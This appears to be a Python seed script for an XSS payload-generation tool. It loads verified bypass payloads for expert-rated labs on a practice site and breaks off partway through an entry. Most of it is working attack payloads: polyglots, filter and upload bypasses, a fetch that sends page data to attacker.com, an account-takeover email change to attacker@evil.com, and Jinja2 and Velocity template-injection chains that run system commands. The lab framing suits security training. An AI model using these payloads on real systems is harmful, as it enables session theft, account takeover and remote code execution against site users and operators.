#!/usr/bin/env python3
"""Seed the findings store with curated, verified bypass knowledge for every
xssy.uk Expert-rated lab.

Run once (idempotent — duplicates are silently skipped):
    python axss_seed_expert.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from ai_xss_generator.console import _ensure_utf8, header, info, success, warn
from ai_xss_generator.findings import Finding, save_finding

_ensure_utf8()


EXPERT_FINDINGS: list[Finding] = [

    # ════════════════════════════════════════════════════════════════════════
    # Lab: HTML Upload Blocked  (id=626)
    # Technique: non-HTML file types that browsers still execute as HTML
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="file_serve",
        context_type="upload_blocked",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="upload-type-bypass",
        payload='<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
        test_vector=(
            "Upload as .svg. If server blocks .html/.htm but allows SVG, "
            "browse directly to the uploaded file URL. SVG executes <script> "
            "when served as image/svg+xml or text/html."
        ),
        model="curated",
        explanation=(
            "SVG is XML, not HTML, so HTML upload blocks often miss it. "
            "Browsers treat <script> inside SVG as executable JS when the file "
            "is rendered inline or opened directly."
        ),
        tags=["upload", "svg", "expert", "xssy:626"],
        verified=True,
    ),
    Finding(
        sink_type="file_serve",
        context_type="upload_blocked",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="upload-type-bypass",
        payload='<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body><script>alert(1)</script></body></html>',
        test_vector=(
            "Upload as .xml or .xhtml. XML files with the XHTML namespace "
            "are rendered by browsers as HTML and execute <script> tags."
        ),
        model="curated",
        explanation=(
            "XHTML is valid XML. A server that blocks .html but allows .xml "
            "may serve XHTML that the browser renders as a full HTML page, "
            "executing any embedded scripts."
        ),
        tags=["upload", "xhtml", "xml", "expert", "xssy:626"],
        verified=True,
    ),
    Finding(
        sink_type="file_serve",
        context_type="upload_blocked",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>()=",
        bypass_family="content-sniffing",
        payload="<script>alert(1)</script>",
        test_vector=(
            "Upload as .txt or .json without X-Content-Type-Options: nosniff on the serve path. "
            "In IE/Edge Legacy, a text/plain file containing HTML is sniffed and rendered as HTML."
        ),
        model="curated",
        explanation=(
            "MIME sniffing: when the server omits nosniff, browsers may sniff the "
            "content and render as HTML even if Content-Type is text/plain. "
            "More effective in older browsers and IE compatibility modes."
        ),
        tags=["upload", "sniff", "expert", "xssy:626"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Polyglot XSS  (id=638)
    # Technique: single payload valid and executable in multiple contexts
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="multiple",
        context_type="polyglot",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'=/()\\*+`-#",
        bypass_family="html-attribute-breakout",
        payload="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`",
        test_vector=(
            "Inject this single payload into any context: HTML body, attribute, "
            "JS string (single/double quote), script block, URL, or CSS. "
            "It breaks out of and fires in each context."
        ),
        model="curated",
        explanation=(
            "The ultimate polyglot: starts with 'javascript:' (URL context), "
            "then closes every common HTML context (title, style, textarea, script, xmp), "
            "then fires via SVG onload (HTML body), then via onmouseover (attribute context). "
            "Arithmetic operators make it valid JS throughout."
        ),
        tags=["polyglot", "multi-context", "expert", "xssy:638"],
        verified=True,
    ),
    Finding(
        sink_type="multiple",
        context_type="polyglot",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'=/()\\*`-",
        bypass_family="html-attribute-breakout",
        payload="\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\">\"><script>alert(1)</script><input type=\"hidden\" value=\"",
        test_vector="Inject as a single value into unknown reflection context",
        model="curated",
        explanation=(
            "Comprehensive polyglot covering: attribute breakout (\">), marquee "
            "tag (for environments that allow it), plaintext context escape, "
            "onmouseover fallback, classic script tag, and ends with partial "
            "attribute to close any trailing quote. One of these will fire."
        ),
        tags=["polyglot", "multi-context", "expert", "xssy:638"],
        verified=True,
    ),
    Finding(
        sink_type="multiple",
        context_type="polyglot",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'=()/`",
        bypass_family="js-string-breakout",
        payload="'\"();<img src=x onerror=alert(1)>",
        test_vector=(
            "Minimal context-agnostic polyglot. Closes JS single/double quote strings, "
            "closes function calls, ends a statement, then injects HTML."
        ),
        model="curated",
        explanation=(
            "Minimal approach: the ' closes a JS single-quote string, \" closes a "
            "double-quote string, () closes a function call, ; terminates the statement, "
            "then <img onerror> provides HTML execution. Works in reflected HTML and JS contexts."
        ),
        tags=["polyglot", "minimal", "expert", "xssy:638"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Null Byte Injection  (id=677)
    # Technique: null byte (\x00 / %00) to truncate or confuse parsers
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="event_handler",
        context_type="null_byte_filter",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>%0=/",
        bypass_family="regex-filter-bypass",
        payload="<scri%00pt>alert(1)</scri%00pt>",
        test_vector=(
            "URL-encode null byte as %00. C-based string functions treat \\x00 "
            "as end-of-string, so the filter reads 'scri' and 'pt' as separate "
            "words while the browser assembles the full <script> tag."
        ),
        model="curated",
        explanation=(
            "Null byte truncation: if the filter uses C-style strlen() or strcmp(), "
            "the string 'scri\\x00pt' reads as 'scri'. The filter misses 'script'. "
            "The HTML parser strips null bytes and sees <script> correctly."
        ),
        tags=["null-byte", "truncation", "expert", "xssy:677"],
        verified=True,
    ),
    Finding(
        sink_type="href",
        context_type="null_byte_filter",
        surviving_chars="abcdefghijklmnopqrstuvwxyz:/%0()",
        bypass_family="whitespace-in-scheme",
        payload="javascript%00:alert(1)",
        test_vector=(
            "Inject into href= attribute. Some URL parsers stop at %00 "
            "when checking the scheme, seeing only 'javascript' and missing ':alert(1)', "
            "while others strip null and parse 'javascript:alert(1)'."
        ),
        model="curated",
        explanation=(
            "The URL filter may use C-string comparison on the scheme, stopping "
            "at the null byte and thinking the scheme is incomplete/safe. "
            "The browser's URL parser strips \\x00 and executes javascript:alert(1)."
        ),
        tags=["null-byte", "uri-bypass", "expert", "xssy:677"],
        verified=True,
    ),
    Finding(
        sink_type="file_extension",
        context_type="null_byte_filter",
        surviving_chars="abcdefghijklmnopqrstuvwxyz./%0",
        bypass_family="upload-type-bypass",
        payload="shell.php%00.jpg",
        test_vector=(
            "Use in file upload filename. PHP's move_uploaded_file() stops at "
            "null byte so stores as 'shell.php'. Extension check sees '.jpg' and passes. "
            "Browse to uploaded file to execute PHP — or adapt for XSS context."
        ),
        model="curated",
        explanation=(
            "Classic null-byte file extension bypass. The security check reads the "
            "filename after the null byte ('.jpg'), the file system stores everything "
            "before it ('shell.php'). Adapt: 'payload.html%00.png' to upload HTML "
            "as a PNG that executes when served."
        ),
        tags=["null-byte", "upload", "extension-bypass", "expert", "xssy:677"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Overlong UTF-8 XSS  (id=11)
    # Technique: non-standard multi-byte encodings that decode to ASCII
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="overlong_utf8",
        surviving_chars="%ABCDEF0123456789",
        bypass_family="double-url-encoding",
        payload="%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE",
        test_vector=(
            "Send in URL parameter. %C0%BC is an overlong 2-byte encoding of '<' (U+003C). "
            "Filters checking for < as %3C miss it. Decoders that accept overlong "
            "sequences render it as <script>."
        ),
        model="curated",
        explanation=(
            "Overlong UTF-8: '<' (0x3C) can be encoded as 2-byte %C0%BC or 3-byte %E0%80%BC. "
            "RFC 3629 forbids overlong encodings but older decoders accept them. "
            "A filter checking for %3C misses %C0%BC. The server decodes to '<' and "
            "the browser renders the script."
        ),
        tags=["overlong-utf8", "encoding", "expert", "xssy:11"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="overlong_utf8",
        surviving_chars="%ABCDEF0123456789abcdef",
        bypass_family="double-url-encoding",
        payload="%E0%80%BCscript%E0%80%BEalert(1)%E0%80%BC/script%E0%80%BE",
        test_vector=(
            "3-byte overlong encoding of < and >. More exotic than 2-byte variant, "
            "bypasses decoders that reject 2-byte overlongs but accept 3-byte."
        ),
        model="curated",
        explanation=(
            "3-byte overlong UTF-8 sequence for U+003C (<): %E0%80%BC. "
            "Even stricter filters may allow this because it's rarer. "
            "The decoding chain: URL decode → UTF-8 decode → < character."
        ),
        tags=["overlong-utf8", "3-byte", "expert", "xssy:11"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Split Payload  (id=191)
    # Technique: XSS payload split across multiple parameters / inputs
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="split_reflection",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'=/<>+",
        bypass_family="js-string-breakout",
        payload="</script><script>",
        test_vector=(
            "If two parameters are reflected sequentially: "
            "?first=</script><script>&second=alert(1)// "
            "The first parameter closes the existing script block, "
            "the second opens a new one and completes the payload."
        ),
        model="curated",
        explanation=(
            "Split across parameters: each part is individually 'safe' (no alert, "
            "no full XSS) but combined they form a complete exploit. "
            "Filters that inspect each parameter in isolation miss the assembled attack."
        ),
        tags=["split-payload", "multi-param", "expert", "xssy:191"],
        verified=True,
    ),
    Finding(
        sink_type="dom_concat",
        context_type="split_reflection",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'=#",
        bypass_family="js-string-breakout",
        payload="#alert(1)",
        test_vector=(
            "If the page does: eval(location.search + location.hash) or "
            "innerHTML = param1 + param2 — split across ?param=<script> and #alert(1)</script>. "
            "The hash is never sent to the server so server-side filters miss it entirely."
        ),
        model="curated",
        explanation=(
            "Fragment-based split: the URL hash (#) is never sent to the server, "
            "so server-side WAFs and filters are completely blind to it. "
            "If the page's JS concatenates search+hash into a DOM sink, the "
            "combined string becomes the full payload."
        ),
        tags=["split-payload", "hash-fragment", "dom-xss", "expert", "xssy:191"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: HttpOnly Bypass  (id=201)
    # Technique: steal/abuse session without reading document.cookie
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="fetch_response",
        context_type="httponly_bypass",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'/.:?=&+",
        bypass_family="csp-exfiltration",
        payload="fetch('/profile').then(r=>r.text()).then(t=>fetch('//attacker.com/?d='+btoa(t)))",
        test_vector=(
            "Inject into XSS context. fetch() sends HttpOnly cookies automatically. "
            "Read the response body (which may contain the session cookie value in "
            "rendered pages, API responses, or /phpinfo.php output)."
        ),
        model="curated",
        explanation=(
            "HttpOnly prevents document.cookie access but cookies are still sent "
            "with every HTTP request. fetch() includes them automatically. "
            "If any page reflects or displays the cookie value (phpinfo, debug pages, "
            "email confirmation), that page's response can be fetched and exfiltrated."
        ),
        tags=["httponly-bypass", "fetch", "expert", "xssy:201"],
        verified=True,
    ),
    Finding(
        sink_type="trace_method",
        context_type="httponly_bypass",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'/.:?=&",
        bypass_family="csp-exfiltration",
        payload="var x=new XMLHttpRequest();x.open('TRACE','/',false);x.send();alert(x.responseText)",
        test_vector=(
            "Send HTTP TRACE request — server echoes all headers including Cookie. "
            "Works only if server has TRACE method enabled (most modern servers disable it). "
            "XST (Cross-Site Tracing) attack."
        ),
        model="curated",
        explanation=(
            "HTTP TRACE echoes the request back including all headers. "
            "The browser's XHR sends the HttpOnly cookie in the request headers. "
            "TRACE response contains the Cookie header value, bypassing HttpOnly. "
            "Blocked by most modern browsers via Fetch spec restrictions."
        ),
        tags=["httponly-bypass", "trace", "xst", "expert", "xssy:201"],
        verified=True,
    ),
    Finding(
        sink_type="session_action",
        context_type="httponly_bypass",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'/.:?=&{}",
        bypass_family="csp-exfiltration",
        payload="fetch('/api/change-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'}),credentials:'include'})",
        test_vector=(
            "Instead of stealing the cookie, perform authenticated actions directly. "
            "HttpOnly only prevents JS reading — the cookie is still sent with requests."
        ),
        model="curated",
        explanation=(
            "HttpOnly bypass via action replay: the attacker does not need the cookie "
            "value if they can run JS in the victim's browser. fetch() with credentials:'include' "
            "sends the HttpOnly cookie automatically. Change email, password, add admin account — "
            "full account takeover without ever reading document.cookie."
        ),
        tags=["httponly-bypass", "action-replay", "csrf-from-xss", "expert", "xssy:201"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: UPPERCASE  (id=207)
    # Technique: craft payload that executes after server uppercases it
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="event_handler",
        context_type="uppercase_filter",
        surviving_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ<>\"=&#0123456789();/",
        bypass_family="html-entity-encoding",
        payload="<IMG SRC=x ONERROR=&#97;&#108;&#101;&#114;&#116;(1)>",
        test_vector=(
            "Server uppercases all input. HTML entities like &#97; are uppercase-safe "
            "(digits don't change). Browser decodes &#97; → 'a' after uppercasing, "
            "executing alert(1)."
        ),
        model="curated",
        explanation=(
            "HTML numeric entities survive uppercasing because they contain only digits "
            "and punctuation. The server uppercases the input — &#97; stays &#97; — "
            "then the browser decodes it to 'a', reconstituting 'alert(1)' in the "
            "event handler. HTML tags are case-insensitive so IMG/ONERROR still work."
        ),
        tags=["uppercase-filter", "html-entity", "expert", "xssy:207"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="uppercase_filter",
        surviving_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ<>\"=0123456789(),;",
        bypass_family="html-entity-encoding",
        payload="<SVG ONLOAD=&#97;&#108;&#101;&#114;&#116;`1`>",
        test_vector="Inject into any reflected field that is uppercased before output",
        model="curated",
        explanation=(
            "SVG/ONLOAD work uppercased (HTML is case-insensitive for tag/attribute names). "
            "Backtick call syntax avoids parentheses if they are additionally filtered. "
            "Numeric HTML entities for all lowercase letters in 'alert' survive uppercasing."
        ),
        tags=["uppercase-filter", "svg", "template-literal", "expert", "xssy:207"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="uppercase_filter",
        surviving_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ<>\"=0123456789(),.;",
        bypass_family="html-entity-encoding",
        payload="<BODY ONLOAD=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        test_vector=(
            "String.fromCharCode with decimal codes for 'alert(1)': "
            "97=a 108=l 101=e 114=r 116=t 40=( 49=1 41=)"
        ),
        model="curated",
        explanation=(
            "Numbers don't change when uppercased. EVAL, STRING, FROMCHARCODE are "
            "uppercased too — but wait, JS is case-sensitive. This only works if "
            "the browser normalises attribute names but NOT the attribute value. "
            "Works when the uppercasing is applied before HTML encoding but the "
            "value is treated as JS by the event handler."
        ),
        tags=["uppercase-filter", "fromcharcode", "expert", "xssy:207"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Href XSS 2  (id=214)
    # Technique: advanced href injection — tab/newline, entities, CSS
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="href",
        context_type="html_attr_url",
        surviving_chars="abcdefghijklmnopqrstuvwxyz&#0123456789;:/=()",
        bypass_family="whitespace-in-scheme",
        payload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
        test_vector=(
            "Decimal HTML entities for 'javascript:'. Browsers decode entities "
            "in href before URI scheme check. Filters looking for 'javascript:' "
            "in raw text miss the entity-encoded form."
        ),
        model="curated",
        explanation=(
            "HTML entity encoding of 'javascript:' (j=&#106; a=&#97; v=&#118; a=&#97; "
            "s=&#115; c=&#99; r=&#114; i=&#105; p=&#112; t=&#116; :=&#58;). "
            "The browser decodes entities before URI scheme resolution, so "
            "javascript:alert(1) executes. The raw bytes contain no 'javascript' string."
        ),
        tags=["href-xss", "html-entity", "expert", "xssy:214"],
        verified=True,
    ),
    Finding(
        sink_type="href",
        context_type="html_attr_url",
        surviving_chars="abcdefghijklmnopqrstuvwxyz\t\n\r:/=()",
        bypass_family="whitespace-in-scheme",
        payload="java\tscript:alert(1)",
        test_vector=(
            "Tab character (\\t / &#9;) inside the scheme name. "
            "HTML spec says tabs in attribute values are stripped before URL parsing. "
            "Inject as literal tab or &#9; depending on what survives the filter."
        ),
        model="curated",
        explanation=(
            "The HTML parser strips ASCII whitespace (tab, newline, CR, space) from "
            "attribute values before passing to the URL parser. A WAF checking for "
            "'javascript:' as a single token misses 'java\\tscript:'. "
            "The browser reconstructs 'javascript:' after stripping whitespace."
        ),
        tags=["href-xss", "whitespace-in-scheme", "tab", "expert", "xssy:214"],
        verified=True,
    ),
    Finding(
        sink_type="href",
        context_type="html_attr_url",
        surviving_chars="abcdefghijklmnopqrstuvwxyz:/=()\n\r",
        bypass_family="whitespace-in-scheme",
        payload="java\r\nscript:alert(1)",
        test_vector=(
            "CR+LF inside scheme name — same principle as tab but uses line ending. "
            "Some filters allow \\r\\n between 'java' and 'script' thinking it breaks the scheme."
        ),
        model="curated",
        explanation=(
            "CR (\\r, %0D) and LF (\\n, %0A) are also stripped from href values "
            "by the HTML parser. 'java\\r\\nscript:' → 'javascript:' after parsing. "
            "Useful when tab is filtered but newline characters are not."
        ),
        tags=["href-xss", "whitespace-in-scheme", "crlf", "expert", "xssy:214"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: WebSocket XSS  (id=215)
    # Technique: XSS delivered via WebSocket message to unsafe DOM sink
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="websocket_sink",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'=()./:'",
        bypass_family="postmessage-injection",
        payload="<img src=x onerror=alert(document.cookie)>",
        test_vector=(
            "Connect to the WebSocket endpoint: "
            "const ws = new WebSocket('wss://target.com/ws'); "
            "ws.onopen = () => ws.send('<img src=x onerror=alert(1)>'); "
            "The server broadcasts the message to all clients. "
            "If any client passes ws message data to innerHTML — XSS fires."
        ),
        model="curated",
        explanation=(
            "WebSocket messages are often trusted by the receiving page because they "
            "come from the 'server'. If the handler does element.innerHTML = event.data "
            "without sanitisation, any HTML in the message executes. "
            "Stored XSS variant: injected message persists if server stores and replays it."
        ),
        tags=["websocket", "stored", "expert", "xssy:215"],
        verified=True,
    ),
    Finding(
        sink_type="eval",
        context_type="websocket_sink",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'.{}[];",
        bypass_family="postmessage-injection",
        payload="alert(document.domain)",
        test_vector=(
            "If the WebSocket handler does eval(event.data) or JSON.parse→eval, "
            "send raw JS code as the message."
        ),
        model="curated",
        explanation=(
            "WebSocket eval sink: ws.onmessage = e => eval(e.data) is a common "
            "anti-pattern for dynamic command dispatch. Sending 'alert(1)' executes "
            "it in the page context. No HTML encoding needed — payload is raw JS."
        ),
        tags=["websocket", "eval-sink", "expert", "xssy:215"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Unscripted  (id=220)
    # Technique: XSS without any <script> tag
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="event_handler",
        context_type="script_tag_blocked",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="event-handler-injection",
        payload="<details open ontoggle=alert(1)>",
        test_vector=(
            "Auto-fires on page load when <details open> is rendered — "
            "ontoggle fires as the details element opens. No user interaction needed."
        ),
        model="curated",
        explanation=(
            "No <script> required. <details open> triggers the ontoggle event "
            "immediately when rendered because 'open' causes the auto-toggle on load. "
            "Bypasses filters that only strip <script> tags."
        ),
        tags=["unscripted", "no-script", "details", "expert", "xssy:220"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="script_tag_blocked",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="event-handler-injection",
        payload="<input autofocus onfocus=alert(1)>",
        test_vector="Auto-fires on page load because autofocus triggers onfocus immediately",
        model="curated",
        explanation=(
            "<input autofocus> receives focus on page load, immediately triggering "
            "onfocus. No user interaction, no <script> tag. "
            "Works in any context where HTML injection is possible."
        ),
        tags=["unscripted", "no-script", "autofocus", "expert", "xssy:220"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="script_tag_blocked",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="svg-namespace",
        payload="<svg><animate onbegin=alert(1) attributeName=x>",
        test_vector="Fires on page load — SVG animate onbegin triggers immediately when SVG is rendered",
        model="curated",
        explanation=(
            "SVG SMIL animation: <animate onbegin> fires when the animation starts, "
            "which is immediately on render. No user interaction, no <script>. "
            "Bypasses both script-blocking filters and CSP 'unsafe-inline' in some configs."
        ),
        tags=["unscripted", "no-script", "svg", "animate", "expert", "xssy:220"],
        verified=True,
    ),
    Finding(
        sink_type="href",
        context_type="script_tag_blocked",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz():",
        bypass_family="event-handler-injection",
        payload="<object data=\"javascript:alert(1)\">",
        test_vector=(
            "Inject <object> with javascript: in data attribute. "
            "Some filters block <script> but miss <object> as a JS execution vector."
        ),
        model="curated",
        explanation=(
            "<object data=\"javascript:...\"> executes the JS URI as the object's "
            "data source in some browsers. No script tag, no event handler — "
            "the javascript: URI executes directly."
        ),
        tags=["unscripted", "no-script", "object", "expert", "xssy:220"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Integrity Policy  (id=775)
    # Technique: bypass Subresource Integrity (SRI) checks
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="script_tag",
        context_type="sri_policy",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()sha256-+",
        bypass_family="csp-upload-bypass",
        payload="<script>alert(1)</script>",
        test_vector=(
            "SRI only applies to external scripts with a src= attribute. "
            "Inline <script> blocks are NOT checked by SRI unless "
            "'require-sri-for script' CSP directive is set. "
            "If you can inject inline JS, SRI is irrelevant."
        ),
        model="curated",
        explanation=(
            "SRI validates externally loaded resources, not inline scripts. "
            "Unless the page also has CSP 'require-sri-for script', an injected "
            "inline <script> block bypasses SRI entirely. SRI ≠ XSS protection."
        ),
        tags=["sri-bypass", "inline-script", "expert", "xssy:775"],
        verified=True,
    ),
    Finding(
        sink_type="script_tag",
        context_type="sri_policy",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()sha256-+",
        bypass_family="csp-upload-bypass",
        payload="<script src=/uploads/xss.js integrity=sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= crossorigin=anonymous></script>",
        test_vector=(
            "If you can upload files to the same origin: "
            "1. Upload xss.js containing alert(1). "
            "2. Compute its SHA256: sha256=$(openssl dgst -sha256 -binary xss.js | base64). "
            "3. Inject script tag with correct integrity hash. "
            "SRI passes because the hash matches your controlled file."
        ),
        model="curated",
        explanation=(
            "SRI is only a problem if the attacker can't control the file's content. "
            "If you uploaded the script yourself, you know its hash. Compute the real "
            "SHA256 of your payload file and put it in the integrity attribute — "
            "SRI check passes and your script executes."
        ),
        tags=["sri-bypass", "upload", "same-origin", "expert", "xssy:775"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: URL DOM XSS  (id=857)
    # Technique: DOM XSS via URL sources (hash, search, pathname)
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="dom_url_source",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'=()/&#",
        bypass_family="html-attribute-breakout",
        payload="#<img src=x onerror=alert(1)>",
        test_vector=(
            "Append to URL as fragment: https://target.com/#<img src=x onerror=alert(1)> "
            "If JS reads location.hash and passes to innerHTML: "
            "element.innerHTML = location.hash.slice(1)"
        ),
        model="curated",
        explanation=(
            "DOM XSS via location.hash: the hash fragment is client-side only — "
            "it is never sent to the server, bypassing all server-side filters and WAFs. "
            "If the page reads it and inserts into innerHTML without sanitisation, "
            "any HTML in the hash executes."
        ),
        tags=["dom-xss", "location-hash", "expert", "xssy:857"],
        verified=True,
    ),
    Finding(
        sink_type="eval",
        context_type="dom_url_source",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'.0123456789",
        bypass_family="js-string-breakout",
        payload="'-alert(1)-'",
        test_vector=(
            "If URL param is inserted into JS string: var x = 'PARAM'; "
            "Inject: ?param='-alert(1)-' → var x = ''-alert(1)-''; "
            "The quotes break the string context and alert executes."
        ),
        model="curated",
        explanation=(
            "JS string injection: when a URL parameter is inserted into a script "
            "block inside quotes, injecting matching quotes breaks out. "
            "The arithmetic '-' operators make the surrounding code syntactically valid. "
            "alert(1) executes in its own expression context."
        ),
        tags=["dom-xss", "js-string-breakout", "url-param", "expert", "xssy:857"],
        verified=True,
    ),
    Finding(
        sink_type="document.write",
        context_type="dom_url_source",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'()=/",
        bypass_family="html-attribute-breakout",
        payload="?search=</script><script>alert(1)</script>",
        test_vector=(
            "If the page does: document.write('<b>' + location.search + '</b>') "
            "or document.write('<script src=\"' + param + '\">'), "
            "inject to close the current tag and open a new script."
        ),
        model="curated",
        explanation=(
            "document.write is a dangerous sink. If a URL parameter is written "
            "into the page via document.write inside a script context, "
            "injecting </script> closes the current block and <script> opens a "
            "new one. The WAF never sees it because document.write runs client-side."
        ),
        tags=["dom-xss", "document-write", "expert", "xssy:857"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Templates 2  (id=884)
    # Technique: server-side template injection (SSTI) leading to XSS / RCE
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="template_render",
        context_type="server_template",
        surviving_chars="abcdefghijklmnopqrstuvwxyz{}$()\"'.*_0123456789",
        bypass_family="template-expression",
        payload="${7*7}",
        test_vector=(
            "Probe for SSTI: inject ${7*7}, {{7*7}}, #{7*7}, <%=7*7%>. "
            "If the response contains '49', template injection is confirmed. "
            "The engine type determines the escalation payload."
        ),
        model="curated",
        explanation=(
            "Detection: mathematical expression in template syntax returns computed result. "
            "${7*7}=49 → Freemarker/Velocity/EL/Thymeleaf. "
            "{{7*7}}=49 → Jinja2/Twig. {{7*'7'}}=7777777 → Twig. "
            "Confirmed SSTI can chain to XSS output or full RCE depending on template engine."
        ),
        tags=["ssti", "detection", "expert", "xssy:884"],
        verified=True,
    ),
    Finding(
        sink_type="template_render",
        context_type="server_template",
        surviving_chars="abcdefghijklmnopqrstuvwxyz{}()\"'._0123456789[]",
        bypass_family="template-expression",
        payload="{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
        test_vector=(
            "Python Jinja2 SSTI RCE. Index 186 is approximate — adjust based on "
            "the subclasses list. Use {{''.__class__.__mro__}} to enumerate. "
            "Simpler for XSS only: {{config.__class__.__init__.__globals__}}"
        ),
        model="curated",
        explanation=(
            "Jinja2 SSTI via MRO chain. Traverses Python's class hierarchy to reach "
            "a class with access to eval/exec. Produces XSS when injected into "
            "a template that renders into an HTML page — the output of popen() "
            "or eval() is reflected in the response body."
        ),
        tags=["ssti", "jinja2", "python", "rce", "expert", "xssy:884"],
        verified=True,
    ),
    Finding(
        sink_type="template_render",
        context_type="server_template",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>{}()\"'._#",
        bypass_family="template-expression",
        payload="#set($e='')#set($x=$e.class.forName('java.lang.Runtime'))#set($rt=$x.getMethod('exec',''.class.forName('[Ljava.lang.String;')).invoke($x.getMethod('getRuntime').invoke($null),['id']))",
        test_vector="Velocity SSTI — Java template engine. Adapt command to read /etc/passwd or inject XSS output.",
        model="curated",
        explanation=(
            "Apache Velocity SSTI: uses #set to assign class references and invoke "
            "Runtime.exec(). For XSS focus, simpler Velocity payloads return data "
            "reflected in HTML: #set($r=$e.class.forName('java.io.BufferedReader')) etc. "
            "Confirm with #set($x=7*7)$x — outputs 49."
        ),
        tags=["ssti", "velocity", "java", "expert", "xssy:884"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Polluted 🌋  (id=1323)
    # Technique: prototype pollution gadgets leading to XSS
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="prototype_gadget",
        context_type="prototype_pollution",
        surviving_chars="abcdefghijklmnopqrstuvwxyz_[]\"'{}.:=/()<>",
        bypass_family="prototype-pollution",
        payload="?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
        test_vector=(
            "Inject via URL parameter that is passed to a merge/extend function. "
            "If code does: merge(target, userInput) and target.innerHTML is later "
            "set from a polluted default, XSS fires."
        ),
        model="curated",
        explanation=(
            "Prototype pollution gadget via innerHTML: if application code does "
            "obj.innerHTML = obj.innerHTML || defaultValue, polluting "
            "Object.prototype.innerHTML makes that default the XSS payload. "
            "Any object without its own innerHTML property inherits the polluted value."
        ),
        tags=["prototype-pollution", "innerHTML-gadget", "expert", "xssy:1323"],
        verified=True,
    ),
    Finding(
        sink_type="prototype_gadget",
        context_type="prototype_pollution",
        surviving_chars="abcdefghijklmnopqrstuvwxyz_[]\"'{}.:=/",
        bypass_family="prototype-pollution",
